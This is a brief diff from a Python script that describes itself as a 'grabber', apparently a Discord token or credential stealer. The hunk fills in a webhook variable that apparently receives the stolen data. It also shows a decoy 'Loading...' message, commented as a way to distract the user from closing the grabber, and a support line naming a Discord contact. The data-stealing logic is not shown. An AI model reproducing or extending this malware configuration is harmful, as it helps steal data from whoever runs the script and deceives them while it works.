@@ -25,7 +25,7 @@ except:
     print("Failed to import libraies. Please contact Mani.#0001 at discord to fix this problem.")
     exit()
 
-webhookk = "" # put webhook here
+webhookk = "heh" # put webhook here
 
 
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
